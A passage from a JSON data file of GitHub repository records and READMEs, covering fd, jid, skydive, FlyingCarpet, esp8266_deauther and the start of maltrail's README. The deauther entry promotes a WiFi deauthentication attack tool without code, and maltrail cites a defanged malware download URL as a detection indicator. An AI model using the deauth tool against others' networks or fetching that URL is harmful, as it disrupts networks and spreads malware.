num_cpu\\ntarget/debug/deps/libnum_cpus-f5ce7ef99006aa05.rlib\\n```\\n\\nTo really search *all* files and directories, simply combine the hidden and ignore features to show\\neverything (`-HI`).\\n\\n### Excluding specific files or directories\\n\\nSometimes we want to ignore search results from a specific subdirectory. For example, we might\\nwant to search all hidden files and directories (`-H`) but exclude all matches from `.git`\\ndirectories. We can use the `-E` (or `--exclude`) option for this. It takes an arbitrary glob\\npattern as an argument:\\n``` bash\\n> fd -H -E .git \\u2026\\n```\\n\\nWe can also use this to skip mounted directories:\\n``` bash\\n> fd -E /mnt/external-drive \\u2026\\n```\\n\\n.. or to skip certain file types:\\n``` bash\\n> fd -E '*.bak' \\u2026\\n```\\n\\nTo make exclude-patterns like these permanent, you can create a `.fdignore` file. They work like\\n`.gitignore` files, but are specific to `fd`. For example:\\n``` bash\\n> cat ~/.fdignore\\n/mnt/external-drive\\n*.bak\\n```\\nNote: `fd` also supports `.ignore` files that are used by other programs such as `rg` or `ag`.\\n\\nIf you want `fd` to ignore these patterns globally, you can put them in `fd`'s global ignore file.\\nThis is usually located in `~/.config/fd/ignore` in macOS or Linux, and `%APPDATA%\\\\fd\\\\ignore` in\\nWindows.\\n\\n### Using fd with `xargs` or `parallel`\\n\\nIf we want to run a command on all search results, we can pipe the output to `xargs`:\\n``` bash\\n> fd -0 -e rs | xargs -0 wc -l\\n```\\nHere, the `-0` option tells *fd* to separate search results by the NULL character (instead of\\nnewlines). In the same way, the `-0` option of `xargs` tells it to read the input in this way.\\n\\n### Deleting files\\n\\nYou can use `fd` to remove all files and directories that are matched by your search pattern.\\nIf you only want to remove files, you can use the `--exec-batch`/`-X` option to call `rm`. For\\nexample, to recursively remove all `.DS_Store` files, run:\\n``` bash\\n> fd -H '^\\\\.DS_Store$' -tf -X rm\\n```\\nIf you are unsure, always call `fd` without `-X rm` first. Alternatively, use `rm`s \\\"interactive\\\"\\noption:\\n``` bash\\n> fd -H '^\\\\.DS_Store$' -tf -X rm -i\\n```\\n\\nIf you also want to remove a certain class of directories, you can use the same technique. You will\\nhave to use `rm`s `--recursive`/`-r` flag to remove directories.\\n\\nNote: there are scenarios where using `fd \\u2026 -X rm -r` can cause race conditions: if you have a\\npath like `\\u2026/foo/bar/foo/\\u2026` and want to remove all directories named `foo`, you can end up in a\\nsituation where the outer `foo` directory is removed first, leading to (harmless) *\\\"'foo/bar/foo':\\nNo such file or directory\\\"* errors in the `rm` call.\\n\\n### Troubleshooting\\n\\n#### `fd` does not find my file!\\n\\nRemember that `fd` ignores hidden directories and files by default. It also ignores patterns\\nfrom `.gitignore` files. If you want to make sure to find absolutely every possible file, always\\nuse the options `-H` and `-I` to disable these two features:\\n``` bash\\n> fd -HI \\u2026\\n```\\n\\n#### `fd` doesn't seem to interpret my regex pattern correctly\\n\\nA lot of special regex characters (like `[]`, `^`, `$`, ..) are also special characters in your\\nshell. If in doubt, always make sure to put single quotes around the regex pattern:\\n\\n``` bash\\n> fd '^[A-Z][0-9]+$'\\n```\\n\\nIf your pattern starts with a dash, you have to add `--` to signal the end of command line\\noptions. Otherwise, the pattern will be interpreted as a command-line option. Alternatively,\\nuse a character class with a single hyphen character:\\n\\n``` bash\\n> fd -- '-pattern'\\n> fd '[-]pattern'\\n```\\n\\n### Integration with other programs\\n\\n#### Using fd with `fzf`\\n\\nYou can use *fd* to generate input for the command-line fuzzy finder [fzf](https://github.com/junegunn/fzf):\\n``` bash\\nexport FZF_DEFAULT_COMMAND='fd --type file'\\nexport FZF_CTRL_T_COMMAND=\\\"$FZF_DEFAULT_COMMAND\\\"\\n```\\n\\nThen, you can type `vim <Ctrl-T>` on your terminal to open fzf and search through the fd-results.\\n\\nAlternatively, you might like to follow symbolic links and include hidden files (but exclude `.git` folders):\\n``` bash\\nexport FZF_DEFAULT_COMMAND='fd --type file --follow --hidden --exclude .git'\\n```\\n\\nYou can even use fd's colored output inside fzf by setting:\\n``` bash\\nexport FZF_DEFAULT_COMMAND=\\\"fd --type file --color=always\\\"\\nexport FZF_DEFAULT_OPTS=\\\"--ansi\\\"\\n```\\n\\nFor more details, see the [Tips section](https://github.com/junegunn/fzf#tips) of the fzf README.\\n\\n#### Using fd with `emacs`\\n\\nThe emacs package [find-file-in-project](https://github.com/technomancy/find-file-in-project) can\\nuse *fd* to find files.\\n\\nAfter installing `find-file-in-project`, add the line `(setq ffip-use-rust-fd t)` to your\\n`~/.emacs` or `~/.emacs.d/init.el` file.\\n\\nIn emacs, run `M-x find-file-in-project-by-selected` to find matching files. Alternatively, run\\n`M-x find-file-in-project` to list all available files in the project.\\n\\n#### Printing fd's output as a tree\\n\\nTo format the output of `fd` similar to the `tree` command, install [`as-tree`] and pipe the output\\nof `fd` to `as-tree`:\\n```bash\\nfd | as-tree\\n```\\n\\nThis can be more useful than running `tree` by itself because `tree` does not ignore any files by\\ndefault, nor does it support as rich a set of options as `fd` does to control what to print:\\n```bash\\n\\u276f fd --extension rs | as-tree\\n.\\n\\u251c\\u2500\\u2500 build.rs\\n\\u2514\\u2500\\u2500 src\\n \\u251c\\u2500\\u2500 app.rs\\n \\u2514\\u2500\\u2500 error.rs\\n```\\n\\nFor more information about `as-tree`, see [the `as-tree` README][`as-tree`].\\n\\n[`as-tree`]: https://github.com/jez/as-tree\\n\\n## Maintainers\\n\\n- [sharkdp](https://github.com/sharkdp)\\n- [tmccombs](https://github.com/tmccombs)\\n\\n## License\\nCopyright (c) 2017-2020 The fd developers\\n\\n`fd` is distributed under the terms of both the MIT License and the Apache License 2.0.\\n\\nSee the [LICENSE-APACHE](LICENSE-APACHE) and [LICENSE-MIT](LICENSE-MIT) files for license details.\\n\"", "topics": ["search", "tool", "filesystem", "terminal", "cli", "regex"], "writeup": "", "ignoredescription": false, "id": 86, "full_name": "sharkdp/fd", "url": "https://github.com/sharkdp/fd", "topic_string": "search tool filesystem terminal cli regex"},
{"tags": [], "owner": "simeji", "description": "json incremental digger", "name": "jid", "topics_string": "", "language": "Go", "readme": "\"# jid\\n\\n[![Circle CI](https://circleci.com/gh/simeji/jid/tree/master.svg?style=shield)](https://circleci.com/gh/simeji/jid/tree/master)\\n\\nJson Incremental Digger\\n\\nIt's a very simple tool. \\nYou can drill down JSON interactively by using filtering queries like [jq](https://stedolan.github.io/jq/).\\n\\n**Suggestion** and **Auto completion** of this tool will provide you a very comfortable JSON drill down.\\n\\n## Demo\\n\\n![demo-jid-main](https://github.com/simeji/jid/wiki/images/demo-jid-main-640-colorize.gif)\\n\\n## Installation\\n\\n* [With homebrew (for Mac)](#with-homebrew-for-mac) \\n* [With pkg (for FreeBSD)](#with-pkg-for-freebsd)\\n* [Other package management system](#other-package-management-systems)\\n* [Simply use \\\"jid\\\" command](#simply-use-jid-command) \\n* [Build](#build) \\n\\n### With homebrew (for Mac)\\n\\n```\\nbrew install jid\\n```\\n\\n### With pkg (for FreeBSD)\\n\\n```\\npkg install jid\\n```\\n\\n### Other package management systems\\n\\nJid can install by package management systems of below OS.\\n\\n[![Packaging status](https://repology.org/badge/vertical-allrepos/jid.svg)](https://repology.org/metapackage/jid/versions)\\n\\n\\n### Simply use \\\"jid\\\" command\\n\\nIf you simply want to use `jid` command, please download binary from below.\\n\\nhttps://github.com/simeji/jid/releases\\n\\n## Build\\n\\n```\\ngo get -u github.com/simeji/jid/cmd/jid\\n```\\n\\n## Usage\\n\\n### Quick start\\n\\n* [simple json example](#simple-json-example) \\n* [simple json example2](#simple-json-example2) \\n* [with initial query](#with-initial-query) \\n* [with curl](#with-curl) \\n\\n#### simple json example\\n\\nPlease execute the below command.\\n\\n```\\necho '{\\\"aa\\\":\\\"2AA2\\\",\\\"bb\\\":{\\\"aaa\\\":[123,\\\"cccc\\\",[1,2]],\\\"c\\\":321}}'| jid\\n```\\n\\nthen, jid will be running.\\n\\nYou can dig JSON data incrementally.\\n\\nWhen you enter `.bb.aaa[2]`, you will see the following.\\n\\n```\\n[Filter]> .bb.aaa[2]\\n[\\n 1,\\n 2\\n]\\n```\\n\\nThen, you press Enter key and output `[1,2]` and exit.\\n\\n#### simple json example2\\n\\nThis json is used by [demo section](https://github.com/simeji/jid#demo).\\n```\\necho '{\\\"info\\\":{\\\"date\\\":\\\"2016-10-23\\\",\\\"version\\\":1.0},\\\"users\\\":[{\\\"name\\\":\\\"simeji\\\",\\\"uri\\\":\\\"https://github.com/simeji\\\",\\\"id\\\":1},{\\\"name\\\":\\\"simeji2\\\",\\\"uri\\\":\\\"https://example.com/simeji\\\",\\\"id\\\":2},{\\\"name\\\":\\\"simeji3\\\",\\\"uri\\\":\\\"https://example.com/simeji3\\\",\\\"id\\\":3}],\\\"userCount\\\":3}}'|jid\\n```\\n\\n#### With a initial query\\n\\nFirst argument of `jid` is initial query.\\n(Use JSON same as [Demo](#demo))\\n\\n![demo-jid-with-query](https://github.com/simeji/jid/wiki/images/demo-jid-with-query-640.gif)\\n\\n#### with curl\\n\\nSample for using [RDAP](https://datatracker.ietf.org/wg/weirds/documents/) data.\\n\\n```\\ncurl -s http://rdg.afilias.info/rdap/domain/example.info | jid\\n```\\n\\n#### Load JSON from a file\\n\\n```\\njid < file.json\\n```\\n\\n## Keymaps\\n\\n|key|description|\\n|:-----------|:----------|\\n|`TAB` / `CTRL` + `I` |Show available items and choice them|\\n|`CTRL` + `W` |Delete from the cursor to the start of the word|\\n|`CTRL` + `U` |Delete whole query|\\n|`CTRL` + `F` / Right Arrow (:arrow_right:)|Move cursor a character to the right|\\n|`CTRL` + `B` / Left Arrow (:arrow_left:)|Move cursor a character to the left|\\n|`CTRL` + `A`|To the first character of the 'Filter'|\\n|`CTRL` + `E`|To the end of the 'Filter'|\\n|`CTRL` + `J`|Scroll json buffer 1 line downwards|\\n|`CTRL` + `K`|Scroll json buffer 1 line upwards|\\n|`CTRL` + `G`|Scroll json buffer to bottom|\\n|`CTRL` + `T`|Scroll json buffer to top|\\n|`CTRL` + `N`|Scroll json buffer 'Page Down'|\\n|`CTRL` + `P`|Scroll json buffer 'Page Up'|\\n|`CTRL` + `L`|Change view mode whole json or keys (only object)|\\n|`ESC`|Hide a candidate box|\\n\\n### Option\\n\\n|option|description|\\n|:-----------|:----------|\\n|First argument ($1) | Initial query|\\n|-h | print a help|\\n|-help | print a help|\\n|-version | print the version and exit|\\n|-q | Output query mode (for jq)|\\n|-M | monochrome output mode|\\n\"", "topics": ["cli", "json", "tool"], "writeup": "Json Incremental Digger\nIt's a very simple tool. You can drill down JSON interactively by using filtering queries like jq.\nSuggestion and Auto completion of this tool will provide you a very comfortable JSON drill down.\n", "ignoredescription": false, "id": 87, "full_name": "simeji/jid", "url": "https://github.com/simeji/jid", "topic_string": "cli json tool"},
{"tags": [], "owner": "skydive-project", "description": "An open source real-time network topology and protocols analyzer", "name": "skydive", "topics_string": "", "language": "Go", "readme": "\"[![GitHub license](https://img.shields.io/badge/license-Apache%20license%202.0-blue.svg)](https://github.com/skydive-project/skydive/blob/master/LICENSE)\\n[![Slack Invite](https://img.shields.io/badge/Slack:-%23skydive&hyphen;project%20invite-blue.svg?style=plastic&logo=slack)](https://slack.skydive.network)\\n[![Slack Channel](https://img.shields.io/badge/Slack:-%23skydive&hyphen;project-blue.svg?style=plastic&logo=slack)](https://skydive-project.slack.com)\\n[![Weekly minutes](https://img.shields.io/badge/Weekly%20Meeting%20Minutes-Thu%2010:30am%20CEST-blue.svg?style=plastic)](https://docs.google.com/document/d/1eri4vyjmAwxiWs2Kp4HYdCUDWACF_HXZDrDL8WcPF-o/edit?ts=5d946ad5#heading=h.g8f8gdfq0un9)\\n[![Go Report Card](https://goreportcard.com/badge/github.com/skydive-project/skydive)](https://goreportcard.com/badge/github.com/skydive-project/skydive)\\n[![CII Best Practices](https://bestpractices.coreinfrastructure.org/projects/2695/badge)](https://bestpractices.coreinfrastructure.org/projects/2695)\\n[![StackShare](https://img.shields.io/badge/tech-stack-0690fa.svg?style=flat)](https://stackshare.io/skydive-project/skydive)\\n[![PyPI](https://img.shields.io/pypi/v/skydive-client.svg)](https://pypi.org/project/skydive-client/)\\n\\n# Skydive\\n\\nSkydive is an open source real-time network topology and protocols analyzer.\\nIt aims to provide a comprehensive way of understanding what is happening in\\nthe network infrastructure.\\n\\nSkydive agents collect topology information and flows and forward them to a\\ncentral agent for further analysis. All the information is stored in an\\nElasticsearch database.\\n\\nSkydive is SDN-agnostic but provides SDN drivers in order to enhance the\\ntopology and flows information.\\n\\n![](https://github.com/skydive-project/skydive.network/raw/images/overview.gif)\\n\\n## Key features\\n\\n* Captures network topology and flows\\n* Full history of network topology and flows\\n* Distributed\\n* Ability to follow a flow along a path in the topology\\n* Supports VMs and Containers infrastructure\\n* Unified query language for topology and flows (Gremlin)\\n* Web and command line interfaces\\n* REST API\\n* Easy to deploy (standalone executable)\\n* Connectors to OpenStack, Docker, OpenContrail, Kubernetes\\n\\n## Quick start\\n\\n### All-in-one\\n\\nThe easiest way to get started is to download the latest binary and to run it using the `all-in-one` mode :\\n\\n```console\\ncurl -Lo - https://github.com/skydive-project/skydive-binaries/raw/jenkins-builds/skydive-latest.gz | gzip -d > skydive && chmod +x skydive && sudo mv skydive /usr/local/bin/\\n\\nSKYDIVE_ETCD_DATA_DIR=/tmp SKYDIVE_ANALYZER_LISTEN=0.0.0.0:8082 sudo -E /usr/local/bin/skydive allinone\\n```\\n\\nOpen a browser to http://localhost:8082 to access the analyzer Web UI.\\n\\n### Docker\\n\\n```console\\ndocker run -d --privileged --pid=host --net=host -p 8082:8082 -p 8081:8081 \\\\\\n -e SKYDIVE_ANALYZER_LISTEN=0.0.0.0:8082 \\\\\\n -v /var/run/docker.sock:/var/run/docker.sock -v /run/netns:/var/run/netns \\\\\\n skydive/skydive allinone\\n```\\n\\nOpen a browser to http://localhost:8082 to access the analyzer Web UI.\\n\\n### Docker Compose\\n\\nTo quick set up a more complete working environment (with history support), [Docker Compose](https://docs.docker.com/compose/)\\ncan be used to automatically start an Elasticsearch container, a Skydive analyzer\\ncontainer and a Skydive agent container.\\n\\n```console\\ncurl -o docker-compose.yml https://raw.githubusercontent.com/skydive-project/skydive/master/contrib/docker/docker-compose.yml\\ndocker-compose up\\n```\\n\\nYou can also use the Skydive [command line client](https://skydive-project.github.io/skydive/getting-started/client/) with:\\n```console\\ndocker run --net=host -ti skydive/skydive client query \\\"g.V()\\\"\\n```\\n\\nOpen a browser to http://localhost:8082 to access the analyzer Web UI.\\n\\n## Documentation\\n\\nSkydive documentation can be found here:\\n\\n* http://skydive.network/documentation\\n\\nThe Skydive REST API is described using swagger [here](http://skydive.network/swagger).\\n\\n## Tutorials\\n\\nSkydive tutorials can be found here:\\n\\n* http://skydive.network/tutorials/first-steps-1.html\\n\\n## Get involved\\n\\n* Weekly meeting\\n * [General - Weekly meeting](https://meet.jit.si/skydive-project) - every Thursday at 10:30 - 11:30 AM CEST\\n * [Minutes](https://docs.google.com/document/d/1eri4vyjmAwxiWs2Kp4HYdCUDWACF_HXZDrDL8WcPF-o/edit?ts=5d946ad5#heading=h.g8f8gdfq0un9)\\n\\n* Slack\\n * Invite : https://slack.skydive.network\\n * Workspace : https://skydive-project.slack.com\\n\\n## Contributing\\n\\nYour contributions are more than welcome. Please check\\nhttps://github.com/skydive-project/skydive/blob/master/CONTRIBUTING.md\\nto know about the process.\\n\\n## License\\n\\nThis software is licensed under the Apache License, Version 2.0 (the\\n\\\"License\\\"); you may not use this software except in compliance with the\\nLicense.\\nYou may obtain a copy of the License at http://www.apache.org/licenses/LICENSE-2.0\\n\\nUnless required by applicable law or agreed to in writing, software\\ndistributed under the License is distributed on an \\\"AS IS\\\" BASIS,\\nWITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\\nSee the License for the specific language governing permissions and\\nlimitations under the License.\\n\"", "topics": ["flow", "pcap", "networking", "monitoring", "graph", "metrics", "ebpf"], "writeup": "Skydive is an open source real-time network topology and protocols analyzer. It aims to provide a comprehensive way of understanding what is happening in the network infrastructure. Skydive agents collect topology information and flows and forward them to a central agent for further analysis. All the information is stored in an Elasticsearch database. Skydive is SDN-agnostic but provides SDN drivers in order to enhance the topology and flows information.\n", "ignoredescription": false, "id": 88, "full_name": "skydive-project/skydive", "url": "https://github.com/skydive-project/skydive", "topic_string": "flow pcap networking monitoring graph metrics ebpf"},
{"tags": [], "owner": "SpacehuhnTech", "description": "Affordable WiFi hacking platform for testing and learning", "name": "esp8266_deauther", "topics_string": "", "language": "C", "readme": "\"# ESP8266 Deauther 2.0\\n\\n<p align=\\\"center\\\"><img alt=\\\"PICTURE logo\\\" src=\\\"https://raw.githubusercontent.com/wiki/spacehuhn/esp8266_deauther/img/deauther_logo.png\\\" width=\\\"200\\\"></p>\\n\\n<p align=\\\"center\\\">\\n\\ud83d\\udc26 <a href=\\\"https://twitter.com/spacehuhn\\\">Twitter</a>\\n| \\ud83d\\udcfa <a href=\\\"https://www.youtube.com/channel/UCFmjA6dnjv-phqrFACyI8tw\\\">YouTube</a>\\n| \\ud83c\\udf0d <a href=\\\"https://spacehuhn.de\\\">spacehuhn.de</a><br>\\n<br>\\n<b>Scan for WiFi devices, block selected connections, create dozens of networks and confuse WiFi scanners!<br><br>\\nClick <a href=\\\"https://github.com/spacehuhn/esp8266_deauther/wiki/Installation\\\">here</a> for the installation tutorial.<br>\\n Click <a href=\\\"https://github.com/spacehuhn/esp8266_deauther/releases\\\">here</a> for the .bin files.<br><br>\\nSupport the development of this project by purchasing one of the <a href=\\\"https://github.com/spacehuhn/esp8266_deauther/wiki/Supported-Devices\\\">official deauther boards</a>.<br/>\\nOr become a patron on <a href=\\\"https://patreon.com/spacehuhn\\\" target=\\\"_blank\\\">patreon.com/spacehuhn</a>.<br>\\nAlso available: <a href=\\\"https://www.tindie.com/products/Spacehuhn/spacehuhn-stickers/\\\">Stickers</a></b>!\\n</p>\\n\\n# [\\ud83d\\udc49 Wiki](https://github.com/SpacehuhnTech/esp8266_deauther/wiki)\\n# [\\ud83d\\udc49 Binaries](https://github.com/SpacehuhnTech/esp8266_deauther/releases)\\n# [\\ud83d\\udc49 Development Boards](https://github.com/SpacehuhnTech/esp8266_deauther/wiki/Supported-Devices)\\n\\n## What is New\\n[Here is a quick video about what is new](https://youtu.be/6oRmm3xfp6U) \\nVersion 2.0:\\n- Completly rewritten code base for better performance and later enhancements\\n- Custom Deauther SDK for easy compiling using Arduino\\n- New serial command line interface to control and debug the program\\n- New display UI with a lot of new functions\\n- Improved web interface with multi-language support\\n- Improved scanning for access points and stations (+ continuous scanning mode)\\n- Save and select device names for both scanning and attacking\\n- Save up to 60 SSIDs and 25 devices in one list (you can create, load and save multiple lists)\\n- Added [PacketMonitor](https://github.com/spacehuhn/PacketMonitor) to display UI\\n- Deauth detection when scanning\\n- RGB LED support for a quick indication what the device is doing (attacking, scanning, ...)\\n- Better documentation on the new [wiki](https://github.com/spacehuhn/esp8266_deauther/wiki)\\n\\n## About this project\\nThis software allows you to easily perform a variety of actions to test 802.11 wireless networks by using an inexpensive ESP8266 WiFi SoC (System On A Chip). \\n\\nThe main feature, the deauthentication attack, is used to disconnect devices from their WiFi network. \\nNo one seems to care about this huge vulnerability in the official 802.11 WiFi standard, so I took action and enabled everyone who has less than 10 USD to spare to recreate this project. \\nI hope it raises more attention on the issue. In 2009 the WiFi Alliance actually fixed the problem (see [802.11w](https://en.wikipedia.org/wiki/IEEE_802.11w-2009)), but only a few companies implemented it into their devices and software. \\nTo effectively prevent a deauthentication attack, both client and access point must support the 802.11w standard with protected management frames (PMF). \\nWhile most client devices seem to support it when the access point forces it, basically no WiFi access point has it enabled. \\n\\nFeel free to test your hardware out, annoy these companies with the problem, share this project and push for a fix!\\nThis project is also a great way to learn more about WiFi, micro controllers, Arduino, hacking and electronics/programming in general. \\n**But please use this tool responsibly and do not use it against others without their permission!**\\n\\nThe difference between deauthing and jamming: [click me](https://github.com/spacehuhn/esp8266_deauther/wiki/FAQ#difference-between-jammer-and-deauther)\\n\\n## Official Deauther Boards\\n\\n![PICTURE DSTIKE Deauther OLED Board](https://raw.githubusercontent.com/wiki/spacehuhn/esp8266_deauther/img/DSTIKE_Deauther_Board.jpg)\\n\\nIf you want to support the development of this project, you can buy one of the official boards by DSTIKE (Travis Lin) on following sites: \\n- [Tindie](https://tindie.com/stores/lspoplove) \\n- [AliExpress](https://dstike.aliexpress.com/store/2996024) \\n- [Taobao](https://shop135375846.taobao.com) \\n\\nThose boards are optimized for this project, ready to use and come preflashed with the Deauther software! \\nFor more details visit the [Wiki](https://github.com/spacehuhn/esp8266_deauther/wiki) under [Supported Devices](https://github.com/spacehuhn/esp8266_deauther/wiki/Supported-Devices). \\n\\n## Disclaimer\\nThis project is a proof of concept for testing and educational purposes. \\nNeither the ESP8266, nor its SDK was meant or built for such purposes. Bugs can occur! \\n\\nUse it only against your own networks and devices! \\nPlease check the legal regulations in your country before using it. \\nI don't take any responsibility for what you do with this program. \\n\\nIt is **not a frequency jammer** as claimed falsely by many people. Its attack, its method and how to protect against it is described above. It uses valid Wi-Fi frames described in the IEEE 802.11 standard and doesn't block or disrupt any frequencies. \\n\\nThis project is meant to draw more attention on this issue. \\nThe [deauthentication](https://en.wikipedia.org/wiki/Wi-Fi_deauthentication_attack) attack shows how vulnerable the 802.11 Wi-Fi standard is and that it has to be fixed. \\nA solution is already there, why don't we use it?\\n\\n**Please don't refer to this project as \\\"jammer\\\", that totally undermines the real purpose of this project!**\\nIf you do, it only proves that you didn't understand anything of what this project stands for. Publishing content about this without a proper explanation shows that you only do it for the clicks, fame and/or money and have no respect for intellectual property, the community behind it and the fight for a better WiFi standard! \\n\\n## Getting Started\\n\\nVisit our new [Wiki](https://github.com/spacehuhn/esp8266_deauther/wiki) on how to recreate this project and use it. \\nHappy Hacking!\\n\\n## Credits\\nA huge thanks to:\\n- [@deantonious](http://github.com/deantonious)\\n- [@jLynx](https://github.com/jLynx)\\n- [@lspoplove](https://github.com/lspoplove)\\n- [@schinfo](https://github.com/schinfo)\\n- [@tobozo](https://github.com/tobozo)\\n- [@xdavidhu](https://github.com/xdavidhu)\\n- [@PwnKitteh](https://github.com/PwnKitteh)\\n\\nfor helping out with various things regarding this project and keeping it alive! \\n\\nI also want to thank Espressif and their community for this awesome chip and all the software and hardware projects around it and the countless tutorials you can find online! \\n\\nShoutout to everyone working on the libraries used for this project:\\n- [esp8266-oled-ssd1306](https://github.com/ThingPulse/esp8266-oled-ssd1306)\\n- [ArduinoJson](https://github.com/bblanchon/ArduinoJson)\\n- [LinkedList](https://github.com/ivanseidel/LinkedList)\\n\\nAlso thanks to everyone that supports this project by [donating](http://spacehuhn.de/donate), being my [patron](http://patreon.com/spacehuhn) or buying one of the [official Deauther boards](https://www.tindie.com/stores/lspoplove) from DSTIKE. \\n\\n## License \\n\\nThis software is licensed under the MIT License. See the [license file](LICENSE) for details. \\n\"", "topics": ["scanning", "wifi", "attack", "offensive", "deauther", "esp8266", "deauth", "board", "arduino"], "writeup": "", "ignoredescription": false, "id": 89, "full_name": "SpacehuhnTech/esp8266_deauther", "url": "https://github.com/SpacehuhnTech/esp8266_deauther", "topic_string": "scanning wifi attack offensive deauther esp8266 deauth board arduino"},
{"tags": [], "owner": "spieglt", "description": "Encrypted file transfer over ad hoc WiFi. No network infrastructure required, just two laptops in close range. Linux, Mac, and Windows.", "name": "FlyingCarpet", "topics_string": "", "language": "Go", "readme": "\"# Flying Carpet\\n\\nTo download, visit the [releases](https://github.com/spieglt/FlyingCarpet/releases) page!\\n\\nWireless, encrypted file transfer over automatically configured ad hoc networking. No network infrastructure required (access point, router, switch). Just two laptops (Mac, Linux, and Windows supported) with wireless chips in close range.\\n\\nDon't have a flash drive? Don't have access to a wireless network or don't trust one? Need to move a file larger than 2GB between different filesystems but don't want to set up a file share? Try it out!\\n\\n# Screenshots:\\n\\n<img src=\\\"pictures/winDemo.png\\\" width=400> <img src=\\\"pictures/macDemo.png\\\" width=400> <img src=\\\"pictures/linuxDemo.png\\\" width=400> \\n\\n# Features:\\n\\n+ Cross-platform: Linux, Mac, and Windows.\\n\\n+ Transfer multiple files at once, without losing progress if the transfer is interrupted or canceled.\\n\\n+ Speeds over 120mbps (with laptops close together).\\n\\n+ Does not use Bluetooth or your local network, just wireless chip to wireless chip.\\n\\n+ Files encrypted in transit.\\n\\n+ Large files supported (<10MB RAM usage while transferring a 4.5GB file).\\n\\n+ No installation required and no dependencies needed.\\n\\n+ Interoperable GUI and CLI versions.\\n\\n# GUI Compilation instructions:\\n\\n+ `go get -x github.com/spieglt/flyingcarpet`\\n\\n+ Windows only: Open `flyingcarpet\\\\WFD_DLL\\\\WFD_DLL.sln` with Visual Studio, and compile in Release mode for x64.\\n\\n+ If compiling on Windows, get `mt.exe` (available in Windows SDKs) and make sure it's in your path.\\n\\n+ Go through the entire setup guide for ![therecipe/qt](https://github.com/therecipe/qt/wiki/Installation) and make sure `qtdeploy` is in your path.\\n\\n+ Install ![go.rice](https://github.com/GeertJohan/go.rice) and make sure `rice` is in your path.\\n\\n+ Run `.\\\\wg_rebuild.ps1` from Powershell (for Windows), `./mg_rebuild` from Terminal (for Mac), or `./lg_rebuild` (for Linux).\\n\\n# CLI Compilation instructions\\n\\n+ `go get -x github.com/spieglt/flyingcarpet`\\n\\n+ Windows only: Open `flyingcarpet\\\\WFD_DLL\\\\WFD_DLL.sln` with Visual Studio, and compile in Release mode for x64. Then install ![go.rice](https://github.com/GeertJohan/go.rice) and make sure `rice` is in your path.\\n\\n+ `cd $GOPATH/src/github.com/spieglt/flyingcarpet/cli`\\n\\n+ Windows only: `.\\\\embed_dll.ps1` from Powershell\\n\\n+ `go build -o flyingcarpet.exe`\\n\\n# Restrictions:\\n\\n+ The Mac version is a standard `.app` bundle, the Linux version is an executable that writes dependencies to a temp location and runs from there, and the Windows version is a `.zip` with an `.exe` and other dependencies inside. I'm working on a better solution for Windows. It was a standalone `.exe` when I was using wxWidgets but this has not been possible since moving to Qt. PRs welcome.\\n\\n+ 64-bit only. Supported Operating Systems: macOS 10.12+, Windows 7+, and Linux Mint 18. I only have access to so many laptops, so if you've tried on other platforms please let me know whether it worked. \\n\\n+ Disables your wireless internet connection while in use (does not apply to Windows when receiving).\\n\\n+ On Mac: You may have to right-click and select \\\"Open\\\" if your settings don't allow running unsigned applications. \\n\\n+ On Windows: Click \\\"More info\\\" and \\\"Run anyway\\\" if you receive a Windows SmartScreen prompt. You may also need to disable WiFi Sense.\\n\\n+ I need help testing on Linux and supporting non-Debian-based distributions! Currently only confirmed to work on Mint 18, and only on wireless cards/drivers that support ad hoc networking with `nmcli`.\\n\\n+ Flying Carpet should rejoin you to your previous wireless network after a completed or canceled transfer. This will not happen if the program freezes, crashes, or if the windows is closed during operation.\\n\\n# Planned features:\\n\\n+ Drag and drop for sending files.\\n\\n+ Folder upload.\\n\\n+ Replace `netsh wlan` with Native WiFi API on Windows.\\n\\n+ Mobile versions, integrating functionality from https://github.com/claudiodangelis/qr-filetransfer.\\n\\nLicenses for third-party tools and libraries used can be found in the \\\"3rd_party_licenses\\\" folder.\\n\\nIf you've used Flying Carpet, please send me feedback! Thank you for your interest!\\n\"", "topics": ["file-transfer"], "writeup": "", "ignoredescription": false, "id": 90, "full_name": "spieglt/FlyingCarpet", "url": "https://github.com/spieglt/FlyingCarpet", "topic_string": "file-transfer"},
{"tags": [], "owner": "stamparm", "description": "Malicious traffic detection system", "name": "maltrail", "topics_string": "", "language": "Python", "readme": "\"![Maltrail](https://i.imgur.com/3xjInOD.png)\\n\\n[![Python 2.6|2.7|3.x](https://img.shields.io/badge/python-2.6|2.7|3.x-yellow.svg)](https://www.python.org/) [![License](https://img.shields.io/badge/license-MIT-red.svg)](https://github.com/stamparm/maltrail#license) [![Malware families](https://img.shields.io/badge/malware_families-1265-orange.svg)](https://github.com/stamparm/maltrail/tree/master/trails/static/malware) [![Malware sinkholes](https://img.shields.io/badge/malware_sinkholes-1330-green.svg)](https://github.com/stamparm/maltrail/tree/master/trails/static/malware) [![Twitter](https://img.shields.io/badge/twitter-@maltrail-blue.svg)](https://twitter.com/maltrail)\\n\\n## Content\\n\\n- [Introduction](#introduction)\\n- [Architecture](#architecture)\\n- [Quick start](#quick-start)\\n- [Administrator's guide](#administrators-guide)\\n - [Sensor](#sensor)\\n - [Server](#server)\\n- [User's guide](#users-guide)\\n - [Reporting interface](#reporting-interface)\\n- [Real-life cases](#real-life-cases)\\n - [Mass scans](#mass-scans)\\n - [Anonymous attackers](#anonymous-attackers)\\n - [Service attackers](#service-attackers)\\n - [Malware](#malware)\\n - [Suspicious domain lookups](#suspicious-domain-lookups)\\n - [Suspicious ipinfo requests](#suspicious-ipinfo-requests)\\n - [Suspicious direct file downloads](#suspicious-direct-file-downloads)\\n - [Suspicious HTTP requests](#suspicious-http-requests)\\n - [Port scanning](#port-scanning)\\n - [DNS resource exhaustion](#dns-resource-exhaustion)\\n - [Data leakage](#data-leakage)\\n - [False positives](#false-positives)\\n- [Requirements](#requirements)\\n- [Best practice(s)](#best-practices)\\n- [License](#license)\\n- [Developers](#developers)\\n- [Presentations](#presentations)\\n- [Blacklist](#blacklist)\\n- [Thank you](#thank-you)\\n- [Third-party integrations](#third-party-integrations)\\n\\n## Introduction\\n\\n**Maltrail** is a malicious traffic detection system, utilizing publicly available (black)lists containing malicious and/or generally suspicious trails, along with static trails compiled from various AV reports and custom user defined lists, where trail can be anything from domain name (e.g. `zvpprsensinaix.com` for [Banjori](http://www.johannesbader.ch/2015/02/the-dga-of-banjori/) malware), URL (e.g. `hXXp://109.162.38.120/harsh02.exe` for known malicious [executable](https://www.virustotal.com/en/file/61f56f71b0b04b36d3ef0c14bbbc0df431290d93592d5dd6e3fffcc583ec1e12/analysis/)), IP address 